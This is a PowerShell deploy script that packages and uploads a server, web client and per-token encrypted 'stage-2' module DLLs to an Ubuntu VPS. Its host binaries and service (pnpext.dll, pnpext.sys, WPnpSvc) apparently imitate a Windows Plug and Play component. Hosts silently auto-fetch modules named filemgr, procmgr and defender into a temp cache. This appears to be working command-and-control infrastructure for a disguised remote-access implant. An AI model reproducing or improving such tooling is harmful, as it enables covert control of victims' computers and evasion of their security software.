# deploy_to_vps.ps1 - one-command end-to-end deploy to an Ubuntu VPS.
#
# Token-agnostic: server.py encrypts stage-2 modules on the fly per
# room_token, so this script doesn't need to know which tokens exist.
# It just ships the unencrypted module DLLs to the VPS once.
#
# Does everything from local to live:
#   1. (Optional) builds the host + stage-2 modules
#   2. Collects server.py + web client + configs + stage-2 DLLs into a tarball
#   3. Uploads to VPS:/tmp/rdp-deploy.tar.gz
#   4. Extracts to /tmp/rdp-deploy/ on VPS
#   5. Runs deploy-vps.sh (places stage-2 DLLs under /opt/remotedesk/stage2/)
#
# Usage:
#   .\deploy_to_vps.ps1 -Vps root@1.2.3.4
#   .\deploy_to_vps.ps1 -Vps root@vps.example.com -SshKey C:\keys\vps.pem
#   .\deploy_to_vps.ps1 -Vps root@1.2.3.4 -SkipBuild      # reuse last build
#
# Requirements (Windows 10/11 has all of these built in):
#   - ssh.exe, scp.exe (OpenSSH client)
#   - tar.exe
#   - A working build: run run_build.ps1 first unless -SkipBuild

param(
    [Parameter(Mandatory=$true)][string]$Vps,
    [string]$User = 'root',
    [string]$SshKey = $null,
    [switch]$SkipBuild = $false
)

$ErrorActionPreference = 'Stop'
$repo = 'D:\Android_Projects\NEW_RDP_Cloud'
Set-Location $repo

# Auto-prepend user@ if caller passed just an IP/hostname. Default user is root.
# (Without this, ssh falls back to the local Windows username, which is almost
# never what you want for VPS deploys.)
if ($Vps -notmatch '@') {
    $Vps = "${User}@$Vps"
    Write-Host ("Using ssh target: {0}" -f $Vps) -ForegroundColor DarkGray
}

# ── 1. (Optional) Build first ───────────────────────────────────────────
if (-not $SkipBuild) {
    Write-Host ""
    Write-Host "=== 1/5  Building host + stage-2 modules ===" -ForegroundColor Cyan
    & "$repo\run_build.ps1"
    if ($LASTEXITCODE -ne 0) { throw "Build failed (exit $LASTEXITCODE)" }
    # Mirror fresh DLL to dist/usb for packaging
    Copy-Item "$repo\build\bin\pnpext.dll" "$repo\dist\usb\pnpext.dll" -Force
}

# ── 2. Verify stage-2 DLLs exist (server encrypts per token at runtime) ─
Write-Host ""
Write-Host "=== 2/5  Checking stage-2 DLLs ===" -ForegroundColor Cyan
$stage2Built = Join-Path $repo 'build\stage2'
$dllsFound = @()
if (Test-Path $stage2Built) {
    # Skip dev-only sample/test modules; those never ship to production.
    $dllsFound = Get-ChildItem $stage2Built -Filter '*.dll' |
        Where-Object { $_.Name -notmatch '^(Stage2Sample|Stage2Test)\.dll$' } |
        Select-Object -ExpandProperty Name
}
if ($dllsFound.Count -gt 0) {
    Write-Host "Found $($dllsFound.Count) stage-2 module DLL(s):"
    foreach ($d in $dllsFound) { Write-Host "  $d" }
} else {
    Write-Host "  WARNING: no stage-2 DLLs in $stage2Built" -ForegroundColor Yellow
    Write-Host "           VPS will have no stage-2 support; host falls back to stage-1 handlers." -ForegroundColor Yellow
}

# ── 3. Stage everything into a temp dir and tar it ──────────────────────
Write-Host ""
Write-Host "=== 3/5  Staging + archiving ===" -ForegroundColor Cyan
$stage = Join-Path $env:TEMP 'rdp-deploy-stage'
if (Test-Path $stage) { Remove-Item $stage -Recurse -Force }
New-Item -ItemType Directory -Force $stage | Out-Null

# Essentials for deploy-vps.sh
$files = @('deploy-vps.sh', 'server.py', 'index.html', 'nginx.conf',
           'nginx-remote-desktop.conf', 'rdp-server.service',
           'host_config.json.template')
foreach ($f in $files) {
    $src = Join-Path $repo $f
    if (Test-Path $src) {
        Copy-Item $src (Join-Path $stage $f) -Force
    }
}

# Host binaries for install-web.ps1 to serve from /files/
foreach ($f in @('pnpext.dll', 'pnpext.sys')) {
    $src = Join-Path $repo "dist\usb\$f"
    if (Test-Path $src) {
        Copy-Item $src (Join-Path $stage $f) -Force
    }
}

# Stage-2 module DLLs -> stage2/*.dll (flat - deploy-vps.sh [4/11] copies
# them to /opt/remotedesk/stage2/; server.py encrypts per-token on the fly).
# Exclude the Stage2Sample/Stage2Test skeletons — those are dev-only.
$stage2Src = Join-Path $repo 'build\stage2'
if (Test-Path $stage2Src) {
    $stage2Dst = Join-Path $stage 'stage2'
    New-Item -ItemType Directory -Force $stage2Dst | Out-Null
    Get-ChildItem $stage2Src -Filter '*.dll' |
        Where-Object { $_.Name -notmatch '^(Stage2Sample|Stage2Test)\.dll$' } |
        ForEach-Object {
            Copy-Item $_.FullName (Join-Path $stage2Dst $_.Name) -Force
        }
}

Write-Host ("Staged files (" + (Get-ChildItem $stage -Recurse -File).Count + " files):")
Get-ChildItem $stage -Recurse -File |
    Select-Object @{n='Path';e={ $_.FullName.Substring($stage.Length + 1) }}, Length |
    Sort-Object Path | Format-Table -AutoSize

# Normalize line endings of shell scripts (Windows -> Unix)
$shFiles = Get-ChildItem $stage -Recurse -Filter '*.sh'
foreach ($f in $shFiles) {
    $c = [System.IO.File]::ReadAllText($f.FullName) -replace "`r`n", "`n"
    [System.IO.File]::WriteAllText($f.FullName, $c)
}

# Create tarball (Windows 10+ has tar.exe)
$archive = Join-Path $env:TEMP 'rdp-deploy.tar.gz'
if (Test-Path $archive) { Remove-Item $archive -Force }
Push-Location $stage
tar.exe -czf $archive .
Pop-Location
$archiveSize = (Get-Item $archive).Length
Write-Host ("Archive: {0} ({1:N0} bytes)" -f $archive, $archiveSize)

# ── 4+5. Upload + extract + deploy in ONE ssh session ──────────────────
# Two password prompts total: one for scp, one for ssh. Use an SSH key
# (-SshKey path) or set up ssh-agent / ~/.ssh/config to avoid prompts entirely.
Write-Host ""
Write-Host "=== 4/5  Uploading archive to $Vps ===" -ForegroundColor Cyan
$sshOpts = @('-o', 'StrictHostKeyChecking=accept-new')
if ($SshKey) { $sshOpts += @('-i', $SshKey) }

& scp @sshOpts $archive "${Vps}:/tmp/rdp-deploy.tar.gz"
if ($LASTEXITCODE -ne 0) { throw "scp failed" }

Write-Host ""
Write-Host "=== 5/5  Extracting + running deploy-vps.sh on $Vps ===" -ForegroundColor Cyan
# All remote steps chained so a single ssh connection handles them. sudo -n
# skips password for sudo if the user has NOPASSWD, else falls back to a
# normal sudo prompt (which runs inside this ssh session too).
$remoteCmd = @(
    'set -e'
    'rm -rf /tmp/rdp-deploy'
    'mkdir -p /tmp/rdp-deploy'
    'tar -xzf /tmp/rdp-deploy.tar.gz -C /tmp/rdp-deploy'
    'rm /tmp/rdp-deploy.tar.gz'
    'chmod +x /tmp/rdp-deploy/*.sh'
    'cd /tmp/rdp-deploy'
    'sudo bash deploy-vps.sh'
) -join ' && '
& ssh @sshOpts $Vps $remoteCmd
$deployExit = $LASTEXITCODE

# Cleanup staging (keep the archive for re-runs if needed)
Remove-Item $stage -Recurse -Force

Write-Host ""
if ($deployExit -eq 0) {
    Write-Host "=== SUCCESS ===" -ForegroundColor Green
    if ($dllsFound -and $dllsFound.Count -gt 0) {
        Write-Host "Stage-2 module DLLs deployed on VPS:"
        foreach ($d in $dllsFound) {
            Write-Host "  /opt/remotedesk/stage2/$d"
        }
        Write-Host "Server encrypts per-token on the fly - any room_token is auto-handled."
    }
    Write-Host "Host(s) will auto-fetch on next WSS auth (+5s)."
    Write-Host ""
    Write-Host "Verify on each target machine after 'sc stop WPnpSvc; sc start WPnpSvc':"
    Write-Host "  dir %TEMP%\pnp_cache\"
    Write-Host "  Event Viewer -> Application, Source=WPnpSvc:"
    Write-Host "    'stage2: loaded filemgr', 'stage2: loaded procmgr', 'stage2: loaded defender'"
} else {
    Write-Host "=== FAILED (deploy-vps.sh exit $deployExit) ===" -ForegroundColor Red
    Write-Host "Check output above; tarball still on VPS? Try:"
    Write-Host "  ssh $Vps 'ls -la /tmp/rdp-deploy/'"
    exit $deployExit
}
